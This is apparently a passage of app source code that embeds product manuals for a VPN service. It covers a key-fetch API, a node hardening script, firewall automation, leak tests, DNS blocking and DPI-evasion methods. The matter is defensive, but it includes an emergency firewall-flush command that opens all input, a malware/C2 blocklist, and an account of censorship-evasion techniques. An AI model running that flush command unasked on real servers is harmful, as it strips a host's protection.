━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. API ENDPOINT: wg-key

  POST /api/daemon-inbound/wg-key
  Authentication: X-Daemon-PSK header (pre-shared secret)
  Body: {"nodeId": <integer>}

  Response (200):
  {"privateKey": "<base64-wireguard-private-key>"}

  Error responses:
  401 — Invalid or missing PSK header
  400 — Missing or invalid nodeId
  429 — IP banned (repeated 401s trigger 30-min in-memory IP ban)

  Security:
  • PSK is a 256-bit random secret stored only in environment variables
  • Repeated auth failures trigger automatic IP ban (30 min, in-memory)
  • Restart the API server to clear IP bans during initial setup/testing

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

5. CLIENT-SIDE KEY HANDLING

Client private keys (your device's WireGuard keys) are generated in:
  • Browser: /wireguard page — keys generated client-side, never sent to server
  • Mobile app: 3-step import flow — keys generated locally, config fetched

The server only receives and stores your PUBLIC key.
Your PRIVATE key stays on your device.

Secure storage recommendations:
  • iOS: WireGuard app uses iOS Keychain
  • Android: WireGuard app uses Android Keystore
  • Linux/macOS/Windows: WireGuard config file — chmod 600 on Linux

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

6. THREAT MODEL

Threat: Physical server seizure (powered off)
  Mitigation: /dev/shm cleared on shutdown — zero key material on disk
  Residual risk: None for key material. Config and PSK still on disk.

Threat: Physical server seizure (powered on)
  Mitigation: Shut down immediately (or pull power). Key in RAM is gone.
  Residual risk: If attacker has physical RAM access before shutdown, key
  could theoretically be recovered via cold-boot. Extremely rare in practice.

Threat: API compromise
  Mitigation: PSK required. Rate limiting. IP ban on repeated failures.
  Residual risk: If PSK is extracted, attacker can request key for any nodeId.
  Rotate PSK immediately if API server is compromised.

Threat: Node operator rogue access
  Mitigation: Audit logs, 2FA on all admin accounts.
  Residual risk: Admin with shell access can read /dev/shm/ while live.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

7. NODE IDs & CONFIGURATION

  Node ID 61 — Chicago
  Node ID 62 — London
  Node ID 63 — Los Angeles
  Node ID 64 — Tokyo

WireGuard listen port: 51820/UDP (default)
WireGuard interface: wg0
Peer allocation: 10.8.0.x/24 (per-device allocation)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

8. TROUBLESHOOTING

Q: WireGuard won't start after reboot.
A: Check proxhq-wg-init service: systemctl status proxhq-wg-init
   If it failed, the API may be unreachable. Test:
   curl -X POST https://api.proxhqvpn.com/api/daemon-inbound/wg-key \
     -H "X-Daemon-PSK: <PSK>" -d '{"nodeId":61}'

Q: 401 errors from the wg-key endpoint.
A: PSK mismatch or IP ban. Restart the API server to clear IP bans.

Q: /dev/shm/wg-private.key exists but wg0 isn't up.
A: Check wg-quick@wg0 override: systemctl cat wg-quick@wg0
   Ensure ExecStart reads from /dev/shm/wg0.conf.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },

  // ── Node Security Hardening ───────────────────────────────────────────────
  {
    id: "node-hardening-manual",
    title: "Node Security Hardening Script",
    subtitle: "9-service automated hardening for all VPN nodes",
    version: "1.0",
    pages: 14,
    icon: Shield,
    iconColor: "text-orange-400",
    tier: "both",
    content: `ProxhqVPN Node Security Hardening Script Manual
Version 1.0 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
legal@alphauntechnologies.com | proxhqvpn.com

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Overview
2. Downloading the Script
3. Pre-Run Checklist
4. The 9 Hardening Services
5. WireGuard Safety Guarantee
6. Running the Script
7. Verifying Installation
8. Service Management Reference
9. Uninstallation
10. FAQ

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

The ProxhqVPN Node Security Hardening Script installs 9 independent
systemd services that collectively harden each VPN node against:
  • Port scanning and reconnaissance
  • SSH brute-force attacks
  • DDoS floods
  • IPS-detected malicious traffic
  • Unauthorized firewall modifications
  • IPv6 bypass attacks

CRITICAL PRINCIPLE: WireGuard peer traffic is NEVER disrupted.
The FORWARD chain has an explicit ACCEPT rule for wg0 traffic.
All hardening applies to the INPUT chain perimeter only.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. DOWNLOADING THE SCRIPT

1. Log in to the ProxhqVPN dashboard.
2. Navigate to: Firewall → NodeSync tab
3. Scroll to: "Full Node Security Hardening Script"
4. Click the download button for your node:
     • Chicago (Node 61)
     • London (Node 62)
     • Los Angeles (Node 63)
     • Tokyo (Node 64)

The downloaded file is named:
  proxhq-hardening-<city>-<nodeId>.sh

Each script has the correct nodeId, PSK, and API base URL
pre-populated from your platform configuration.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. PRE-RUN CHECKLIST

Before running the script, verify:
  ☐ You have your SSH public key in ~/.ssh/authorized_keys on the node
      (the script disables password auth — you will be locked out without this)
  ☐ You are logged in as root or have sudo access
  ☐ The node has internet access to install packages (apt)
  ☐ Suricata is installed (for sec-reporter and ATR services)
      Install: apt-get install suricata -y
  ☐ The API server is reachable from the node
      Test: curl -s https://api.proxhqvpn.com/api/healthz

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. THE 9 HARDENING SERVICES

SERVICE 1: sysctl Hardening
  Config: written to /etc/sysctl.d/99-proxhq.conf
  Applied: sysctl --system
  Parameters:
    net.ipv4.conf.all.rp_filter=1          # anti-spoofing
    net.ipv4.tcp_syncookies=1              # SYN flood protection
    net.ipv4.conf.all.accept_redirects=0   # no ICMP redirects
    net.ipv4.conf.all.log_martians=1       # log suspicious packets
    kernel.randomize_va_space=2            # ASLR max
    kernel.kptr_restrict=2                 # hide kernel pointers
    kernel.dmesg_restrict=1               # restrict dmesg
    net.ipv6.conf.all.accept_redirects=0  # IPv6 redirect block
    net.ipv4.conf.default.rp_filter=1     # default iface anti-spoof

SERVICE 2: WireGuard-Aware iptables
  Sets default DROP policy on INPUT and FORWARD, then:
  ALLOW: loopback (lo), ICMP, established connections
  ALLOW: 51820/UDP (WireGuard)
  ALLOW: 22/TCP (SSH)
  ALLOW: FORWARD -i wg0 -j ACCEPT  (VPN clients in)
  ALLOW: FORWARD -o wg0 -j ACCEPT  (VPN clients out)
  DROP: all other INPUT

SERVICE 3: IPv6 Mirror (ip6tables)
  Mirrors all iptables rules to ip6tables:
  Same DROP INPUT policy, same FORWARD ACCEPT for wg0,
  same SSH allow. Prevents IPv6 bypass attacks.

SERVICE 4: fail2ban
  Service name: fail2ban
  SSH jail: 3 failures = 1-hour ban, 6 failures = 24-hour ban
  Monitors: /var/log/auth.log, API access log (repeated 401s)
  Actions: iptables ban + ip6tables ban simultaneously

SERVICE 5: SSH Hardening
  Rewrites /etc/ssh/sshd_config:
  PasswordAuthentication no
  PermitRootLogin no
  MaxAuthTries 3
  ClientAliveInterval 300
  ClientAliveCountMax 2
  AllowAgentForwarding no
  X11Forwarding no
  Restarts sshd after applying.

SERVICE 6: proxhq-ddos-monitor
  Polls every 10 seconds using ss + conntrack.
  Threshold: 5,000 new connections / 10 s per source IP.
  Action: immediate iptables ban (30-min expiry).
  Reports event to: POST /api/daemon-inbound/traffic-flag

SERVICE 7: proxhq-sec-reporter
  Tails /var/log/suricata/fast.log (Suricata IPS).
  When a VPN peer IP matches an alert:
    → Logs to dashboard Security Events table.
    → Traffic still flows (observation only, not blocking).
  Reports to: POST /api/daemon-inbound/ips-event

SERVICE 8: proxhq-peer-rules
  Polls every 60 seconds:
  GET /api/daemon-inbound/peer-rules-export
  Resolves each peer public key → allocated IP (wg show allowed-ips).
  Applies iptables FORWARD rules: ACCEPT / DROP / LIMIT per peer.
  This is how per-device firewall rules work in real time.

SERVICE 9: proxhq-fw-sync
  Polls every 30 seconds:
  GET /api/daemon-inbound/wg-config
  Fetches full iptables ruleset from the dashboard.
  Applies atomically with iptables-restore.
  Firewall UI changes propagate to all nodes within 30 seconds.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

5. WIREGUARD SAFETY GUARANTEE

The hardening script sets the following iptables FORWARD rules FIRST,
before any DROP rules:

  iptables -A FORWARD -i wg0 -j ACCEPT
  iptables -A FORWARD -o wg0 -j ACCEPT
  ip6tables -A FORWARD -i wg0 -j ACCEPT
  ip6tables -A FORWARD -o wg0 -j ACCEPT

These rules ensure:
  • VPN client traffic entering on wg0 is always forwarded to internet
  • VPN client return traffic arriving from internet is forwarded to wg0
  • The INPUT DROP policy does NOT apply to FORWARD chain traffic
  • ATR, DDoS monitor, and per-peer rules NEVER remove these ACCEPT rules

The only way a VPN user can be affected is if a per-peer rule explicitly
blocks their public key (configured intentionally in Firewall → Peer Rules).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

6. RUNNING THE SCRIPT

  # Copy script to node:
  scp proxhq-hardening-chicago-61.sh root@NODE_IP:/root/

  # Make executable and run:
  chmod +x proxhq-hardening-chicago-61.sh
  bash proxhq-hardening-chicago-61.sh 2>&1 | tee hardening.log

  # Script runtime: ~3-5 minutes (package installs)
  # The script is idempotent — safe to re-run after updates

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

7. VERIFYING INSTALLATION

  # Check all 9 services are active:
  systemctl is-active fail2ban sshd \
    proxhq-ddos-monitor proxhq-sec-reporter \
    proxhq-peer-rules proxhq-atr-watchdog \
    proxhq-fw-sync

  # Verify iptables FORWARD rules:
  iptables -L FORWARD -n | grep wg0

  # Check sysctl:
  sysctl net.ipv4.tcp_syncookies

  # Test firewall sync (wait 30s after install):
  journalctl -u proxhq-fw-sync -n 20

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

8. SERVICE MANAGEMENT REFERENCE

  # View service logs:
  journalctl -u proxhq-ddos-monitor -f
  journalctl -u proxhq-sec-reporter -f
  journalctl -u proxhq-fw-sync -f

  # Restart a service:
  systemctl restart proxhq-fw-sync

  # Disable a service (without uninstalling):
  systemctl stop proxhq-ddos-monitor
  systemctl disable proxhq-ddos-monitor

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

9. UNINSTALLATION

  # Stop and disable all ProxhqVPN services:
  for svc in proxhq-ddos-monitor proxhq-sec-reporter proxhq-peer-rules proxhq-atr-watchdog proxhq-fw-sync; do
    systemctl stop $svc
    systemctl disable $svc
    rm /etc/systemd/system/$svc.service
  done
  systemctl daemon-reload

  # Restore iptables to ACCEPT all (emergency):
  iptables -F && iptables -P INPUT ACCEPT
  ip6tables -F && ip6tables -P INPUT ACCEPT

  # Remove sysctl hardening:
  rm /etc/sysctl.d/99-proxhq.conf && sysctl --system

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

10. FAQ

Q: Will this script lock me out of SSH?
A: Only if your SSH public key is not in ~/.ssh/authorized_keys.
   The script disables password auth. Add your key first:
   ssh-copy-id root@NODE_IP

Q: Does the DDoS monitor affect VPN users?
A: No. It monitors the INPUT chain (external connections to the node).
   WireGuard UDP (51820) is on the INPUT ACCEPT list and is excluded
   from DDoS monitoring by protocol.

Q: What if fail2ban bans my own IP?
A: ssh root@NODE_IP "fail2ban-client set sshd unbanip YOUR_IP"
   Or wait for the ban to expire (1h for first offense).

Q: Do I need Suricata installed?
A: Yes for proxhq-sec-reporter and proxhq-atr-watchdog.
   Install: apt-get install suricata -y
   These services gracefully degrade if Suricata logs are absent.

Q: How often does firewall sync run?
A: Every 30 seconds. Rule changes made in the Firewall UI
   propagate to all nodes within 30 seconds automatically.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },

  // ── Advanced Firewall Suite ───────────────────────────────────────────────
  {
    id: "advanced-firewall-manual",
    title: "Advanced Firewall Suite",
    subtitle: "ATR, Composite Risk Score, Peer Rules, DDoS Shield, AI Optimizer",
    version: "1.0",
    pages: 11,
    icon: Shield,
    iconColor: "text-red-400",
    tier: "both",
    content: `ProxhqVPN Advanced Firewall Suite Manual
Version 1.0 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
legal@alphauntechnologies.com | proxhqvpn.com

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Overview
2. ATR — Auto Threat Response
3. Composite IP Risk Score
4. Per-WireGuard-Peer Firewall Rules
5. Adaptive DDoS Shield
6. AI Firewall Rule Optimizer
7. Security Events Log
8. Integration with Node Hardening
9. API Reference

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

The Advanced Firewall Suite extends the base ProxhqVPN Firewall with
5 new intelligent protection layers:

  ATR             — Auto Threat Response (IPS-triggered auto-actions)
  Risk Score      — Composite 0–100 threat score per blocked IP
  Peer Rules      — Per WireGuard key allow/block/throttle rules
  DDoS Shield     — Adaptive connection-rate flood protection
  AI Optimizer    — Machine-guided rule set optimization suggestions

CORE PRINCIPLE: VPN users are NEVER disrupted. All enforcement happens
on the node perimeter (INPUT chain). WireGuard FORWARD rules always
accept peer traffic. Per-peer rules are the only exception — they apply
to the FORWARD chain only when explicitly configured per public key.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. ATR — AUTO THREAT RESPONSE

Location: Firewall → ATR tab

Purpose: Automatically respond to IPS signature matches from Suricata
without requiring admin review or approval.

Response Levels:
  Monitor  — Log the event to Security Events. No traffic change.
  Throttle — Rate-limit the source to 128 Kbps. Connection continues.
  Trap     — Redirect source IP to SilkWeb honeypot (data collection).
  Block    — Immediate DROP + ip6tables mirror. 24h expiry.

Configuration:
  • Set global default response level for IPS events.
  • Override per Suricata rule category (e.g., "ET SCAN" → Block,
    "ET INFO" → Monitor, "ET MALWARE" → Trap).
  • Whitelist specific IPs that should never be auto-blocked.

How it works:
  1. Node's proxhq-atr-watchdog tails Suricata fast.log.
  2. Matched alert → POSTs to POST /api/daemon-inbound/ips-event.
  3. API evaluates the configured ATR level for that rule category.
  4. Pushes the response action back to the node via the fw-sync daemon.
  5. Node applies iptables rule (or throttle/redirect) within 30 seconds.

Safety:
  ATR NEVER acts on port 51820/UDP (WireGuard handshakes).
  ATR NEVER modifies FORWARD chain wg0 rules.
  ATR actions can be reviewed and reversed in the Security Events log.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. COMPOSITE IP RISK SCORE

Location: Firewall → Blocked IPs tab (score shown per IP)

Purpose: Prioritize which blocked IPs deserve permanent blocks vs
temporary holds by aggregating all available threat signals.

Score Components (total: 0–100):
  Threat Feed Confidence     0–30 pts  (AbuseIPDB, OTX, etc.)
  Beacon Alert Hit Count     0–20 pts  (SilkWeb honeypot hits)
  IPS Signature Match Weight 0–20 pts  (Suricata rule severity)
  GeoIP Block Status         0–10 pts  (in a blocked country)
  fail2ban Hit Count         0–10 pts  (repeated auth failures)
  Ghost Trace Anomaly Contribution  0–10 pts

Score thresholds:
  0–30:  Low — monitor only, short expiry block
  31–60: Medium — standard 24h block
  61–80: High — 7-day block, promoted to blocklist
  81–100: Critical — permanent block, reported to threat feed

Auto-actions by score:
  Score ≥ 81: Promoted to permanent block automatically.
  Score ≥ 61: Retained for 7 days even if short block was set.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. PER-WIREGUARD-PEER FIREWALL RULES

Location: Firewall → Peer Rules tab

Purpose: Apply allow / block / throttle rules to individual WireGuard
clients by their public key without removing their WireGuard config.

Rule fields:
  Public Key   — WireGuard client public key (base64)
  Action       — ACCEPT / DROP / LIMIT (rate limit)
  Direction    — any / inbound (from peer) / outbound (to peer)
  Throttle Kbps — if action=LIMIT, rate limit in Kbps
  Reason       — admin note (visible in audit log)
  Expiry       — optional: auto-expire rule after N hours

How rules are applied:
  1. proxhq-peer-rules service polls the API every 60 seconds.
  2. Fetches rules from: GET /api/daemon-inbound/peer-rules-export
  3. For each rule: resolves public key → peer IP via:
       wg show wg0 allowed-ips | grep <pubkey>
  4. Applies iptables FORWARD rule for that peer IP.
  5. Old rules for that key are replaced atomically.

Example use cases:
  • Temporarily block a device suspected of misuse without
    removing its WireGuard config (can re-enable instantly).
  • Throttle a specific device that's consuming excessive bandwidth.
  • Block outbound from a peer while allowing inbound (asymmetric).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

5. ADAPTIVE DDOS SHIELD

Location: Firewall → DDoS tab
Node service: proxhq-ddos-monitor (systemd)

Purpose: Automatically detect and ban flood sources at the node
perimeter without any admin intervention.

Detection method:
  ss -s and conntrack are polled every 10 seconds per node.
  A source IP creating more than THRESHOLD new connections in the
  polling window is classified as a flood source.

Default threshold: 5,000 connections / 10 seconds
Configurable range: 100 – 50,000 connections / 10 seconds

Actions on detection:
  1. Source IP immediately banned via iptables DROP (30-min expiry).
  2. ip6tables DROP also applied (IPv6 source if applicable).
  3. Event reported to: POST /api/daemon-inbound/traffic-flag
  4. Security Events log shows: timestamp, source IP/CIDR, connection count.

What is NOT affected:
  • UDP 51820 (WireGuard) — excluded from DDoS monitoring by protocol
  • Existing established WireGuard sessions — FORWARD chain is untouched
  • Admin SSH (22/TCP) — allowlisted separately

Viewing DDoS events:
  Firewall → Security Events → filter by source "DDoS Monitor"

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

6. AI FIREWALL RULE OPTIMIZER

Location: Firewall → Optimizer tab

Purpose: Analyze the current firewall ruleset and surface actionable
optimization suggestions — without automatically applying any changes.
All suggestions require admin approval before being applied.

Suggestion categories:
  CIDR Consolidation
    Detects multiple individual IPs from the same /24 or /16.
    Suggests merging into a supernet (e.g., 10 IPs in 185.220.101.x
    → suggest blocking 185.220.101.0/24 instead).

  Rule Reordering (Hot Path)
    Analyzes hit counts per rule over the last 7 days.
    Suggests moving high-hit rules to lower priority numbers
    (evaluated first) to reduce iptables chain traversal time.

  Shadowed Rule Detection
    Identifies rules that are never evaluated because a broader
    rule earlier in the chain already matches and drops/accepts.
    Example: a specific ALLOW for 10.0.0.5 that comes AFTER
    a DROP for 10.0.0.0/8 — the ALLOW is never reached.

  GeoIP Overlap
    Detects individual IP blocks that are already covered by
    an active GeoIP country block — redundant rules to remove.

  Expired Block Cleanup
    Lists blocks with expiry > 30 days ago that were never
    explicitly promoted to permanent — safe to remove.

Using suggestions:
  • Each suggestion shows: current rule, proposed change, reason.
  • Click "Apply" on any suggestion to stage it for review.
  • Staged changes are previewed before being committed to the ruleset.
  • All applies are logged in the audit trail.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

7. SECURITY EVENTS LOG

Location: Firewall → Security Events tab

Records:
  • ATR actions (source IP, rule triggered, response applied)
  • DDoS monitor bans (source, connection count, duration)
  • Per-peer rule changes (public key, action, admin who applied)
  • Firewall sync confirmations (timestamp, ruleset hash)
  • IPS events from Suricata (signature, peer IP, severity)

Filtering:
  Source: ATR / DDoS / Peer Rules / Sync / IPS
  Severity: Critical / High / Medium / Low / Info
  Date range: last 1h / 24h / 7d / 30d / custom
  Search: full-text across IPs, signatures, rule names

Export: CSV / JSON (Splunk/Elastic compatible)

Note: Security events are read-only records. They document what
happened but do not affect traffic. All traffic decisions are
made by iptables rules, not by the event log.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

8. INTEGRATION WITH NODE HARDENING

The Advanced Firewall Suite requires the Node Security Hardening Script
to be installed for full functionality:

  proxhq-atr-watchdog   → ATR (reads Suricata, pushes to API)
  proxhq-ddos-monitor   → DDoS Shield (monitors connections)
  proxhq-peer-rules     → Peer Rules (applies FORWARD rules per key)
  proxhq-fw-sync        → Firewall Sync (propagates rule changes)

Without the hardening script:
  • ATR suggestions appear in the dashboard but are NOT auto-applied
  • DDoS events are not reported from nodes
  • Peer rules must be manually applied via SSH on each node
  • Firewall UI changes do NOT propagate automatically

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

9. API REFERENCE

  POST /api/daemon-inbound/ips-event
    Body: {nodeId, peerIp, signature, severity}
    Action: logs IPS event, evaluates ATR level, schedules response

  POST /api/daemon-inbound/traffic-flag
    Body: {nodeId, peerIp?, destIp?, flagReason}
    Action: logs security event (traffic always flows; observation only)

  GET /api/daemon-inbound/peer-rules-export?nodeId=N
    Returns: [{peerPublicKey, action, throttleKbps, direction}]
    Used by: proxhq-peer-rules service (polls every 60s)

  GET /api/firewall/security-events
    Returns: paginated security event log for dashboard display

  GET /api/firewall/node-hardening-script?nodeId=N
    Returns: bash script text (Content-Disposition: attachment)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },

  // ── VPN & Privacy — Core (new additions) ──────────────────────────────────
  {
    id: "leak-detection-manual",
    title: "Leak Detection Suite",
    subtitle: "DNS, IPv6 & WebRTC Leak Testing",
    tier: "both",
    pages: 5,
    icon: Search,
    version: "1.0",
    iconColor: "text-yellow-400",
    content: `LEAK DETECTION SUITE — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

The Leak Detection Suite tests your VPN connection for three critical
privacy vulnerabilities that can expose your real identity even when
a VPN appears to be working:

  • DNS Leak     — your ISP can see what domains you visit
  • IPv6 Leak    — your real IPv6 address bypasses the VPN tunnel
  • WebRTC Leak  — the browser exposes your local/public IP via RTC

Navigate to: Dashboard → Leak Test (or /leaks)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. DNS LEAK TEST

How it works:
  Each DNS test makes a series of DNS queries to unique subdomains
  of a ProxhqVPN-controlled DNS log server. If your ISP's resolver
  answers those queries instead of ProxhqVPN's resolver, your ISP
  can see every domain you look up.

What to look for:
  PASS — only ProxhqVPN resolver IPs appear in the results
  FAIL — your ISP's resolver IP appears, or geolocation shows
         your real country/city

Fix a DNS leak:
  1. Enable DNS Shield (Settings → DNS Protection → Enable)
  2. Set DNS-over-HTTPS provider to ProxhqVPN or Cloudflare 1.1.1.1
  3. On Linux: edit /etc/resolv.conf → nameserver 10.8.0.1
  4. Re-run the test to confirm

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. IPv6 LEAK TEST

Most consumer ISPs now assign IPv6 addresses. If your VPN only
tunnels IPv4, your real IPv6 address is visible to every site you visit.

ProxhqVPN mitigation:
  Kill Switch → Enable IPv6 Protection applies ip6tables rules that
  DROP all IPv6 traffic not routed through the WireGuard interface.
  The Node Security Hardening Script mirrors all ip6tables rules
  automatically on every node.

Fix an IPv6 leak:
  1. Kill Switch → Enable → toggle "IPv6 Leak Protection"
  2. Alternatively, disable IPv6 on your OS adapter entirely
  3. Linux: sysctl net.ipv6.conf.all.disable_ipv6=1
  4. Windows: netsh int ipv6 set global randomizeidentifiers=disabled

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. WebRTC LEAK TEST

WebRTC is a browser protocol for real-time communication. It can expose
your local network IP and sometimes your public IP even through a VPN,
because the browser accesses STUN/TURN servers outside the tunnel.

Browser mitigations:
  Chrome/Brave  → install "WebRTC Leak Prevent" or "uBlock Origin"
                  (enable "Prevent WebRTC from leaking local IP")
  Firefox       → about:config → media.peerconnection.enabled = false
  Safari        → WebRTC is more restricted; leaks less common

ProxhqVPN mitigation:
  The browser extension (when available) intercepts WebRTC API calls
  and routes STUN requests through the VPN tunnel.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

5. CONTINUOUS LEAK MONITORING

The Leak Test page includes a "Run All Tests" button and an
auto-refresh option (every 5 minutes) for ongoing monitoring.
Results are logged to the Security Event Log (SIEM) for audit trails.

API: GET /api/leaks/dns-check · /api/leaks/ipv6-check · /api/leaks/webrtc-info

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "dns-shield-manual",
    title: "DNS Shield",
    subtitle: "DNS-Level Ad, Tracker & Malware Blocking",
    tier: "both",
    pages: 5,
    icon: Shield,
    version: "1.0",
    iconColor: "text-blue-400",
    content: `DNS SHIELD — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

DNS Shield is ProxhqVPN's built-in DNS-level content blocker, similar
to Pi-hole and AdGuard Home. It intercepts DNS queries at the resolver
level and blocks requests to domains on curated blocklists — before
any connection is made to the ad/tracker/malware server.

Navigate to: Dashboard → DNS Protection → DNS Shield (/dns-shield)

Key benefit: blocking at DNS level means zero bandwidth is used by
ads and trackers — they never reach your device at all.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. BLOCK CATEGORIES

Toggle any category on or off. Changes apply immediately:

  Ads             — advertising networks, banner/video ad domains
  Trackers        — analytics, user behaviour tracking, heatmaps
  Malware         — known malware C2, phishing, dropper domains
  Phishing        — credential harvesting domains
  Cryptomining    — browser-based mining (Coinhive derivatives)
  Botnet C2       — command-and-control infrastructure
  Adult Content   — optional content filtering

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. CUSTOM RULES

Add your own allow (whitelist) or block (blacklist) rules:

  1. Go to DNS Shield → Custom Rules
  2. Enter the domain (e.g. analytics.example.com)
  3. Select Allow or Block
  4. Click Add Rule

Custom rules take precedence over all built-in blocklists.
Rules match the exact domain AND all subdomains unless prefixed with
a dot (e.g. .ads.example.com matches only that subdomain).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. DOMAIN LOOKUP TOOL

Test whether a specific domain would be blocked:
  1. DNS Shield → Lookup
  2. Enter domain name
  3. Result shows: BLOCKED / ALLOWED + which rule matched

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

5. DNS-OVER-HTTPS (DoH)

Enable DoH to encrypt all DNS queries end-to-end, preventing ISP
interception of even metadata:

  Providers: Cloudflare 1.1.1.1, Google 8.8.8.8, ProxhqVPN resolver
  Protocol: HTTPS POST (RFC 8484)
  Fallback: standard UDP 53 if DoH is unreachable

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

6. STATISTICS

24-hour stats shown on the DNS Shield dashboard:
  • Total queries processed
  • Queries blocked (number + percentage)
  • Queries allowed
  • Top 10 blocked domains chart

API: GET /api/dns-shield/stats · /api/dns-shield/rules · POST /api/dns-shield/lookup

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "obfuscation-manual",
    title: "Stealth Protocol & DPI Obfuscation",
    subtitle: "Bypassing Deep Packet Inspection",
    tier: "both",
    pages: 6,
    icon: Eye,
    version: "1.0",
    iconColor: "text-violet-400",
    content: `STEALTH PROTOCOL & DPI OBFUSCATION — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

Deep Packet Inspection (DPI) is used by ISPs, governments, and
corporate firewalls to detect and block VPN protocols. ProxhqVPN
offers six obfuscation techniques that disguise WireGuard traffic
as ordinary web traffic, making it undetectable.

Navigate to: Dashboard → Stealth Protocol (/obfuscation)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. OBFUSCATION METHODS

obfs4 (Tor Project):
  Adds random-looking padding and re-randomizes packet timing.
  Effective against signature-based DPI. Tor Browser project standard.
  Config: Bridge address + certificate fingerprint required.

Shadowsocks (SOCKS5 over encrypted TCP):
  Disguises traffic as HTTPS. Widely used to bypass China's Great
  Firewall. Fast and lightweight.
  Config: Server IP, port, password, cipher (ChaCha20-IETF-Poly1305)

V2Ray WebSocket + TLS:
  WireGuard wrapped in WebSocket then TLS. Appears identical to
  normal HTTPS web browsing. The strongest obfuscation for
  censorship-heavy networks.
  Config: WebSocket path (e.g. /vpn), TLS domain, port 443

Meek (domain-fronting):
  Routes traffic through a CDN (Cloudflare, Azure, or Google) so
  DPI sees traffic to a legitimate CDN endpoint, not a VPN server.
  Highest latency but extremely hard to block without blocking CDN.

Snowflake (WebRTC proxies):
  Uses volunteer WebRTC proxies as entry points. Traffic appears
  as browser WebRTC calls. Requires Tor for full routing.

XOR Scramble:
  Simple XOR byte-scrambling of WireGuard UDP packets. Lightweight,
  CPU-free, effective against basic DPI signatures but not ML-based.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. CHOOSING A METHOD

  Restricted network (office/school): V2Ray WebSocket+TLS or Shadowsocks
  High-censorship country: V2Ray WebSocket+TLS or Meek
  Tor network: Snowflake → Tor → WireGuard
  Low-latency priority: XOR Scramble or Shadowsocks
  Maximum stealth: obfs4 or V2Ray WebSocket+TLS

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. CONFIGURATION

Each method generates a config block you paste into your WireGuard
or proxy client:
  1. Select a method
  2. Choose a node (LA, London, Chicago, Tokyo)
  3. Click "Generate Config"
  4. Copy and paste into your client application

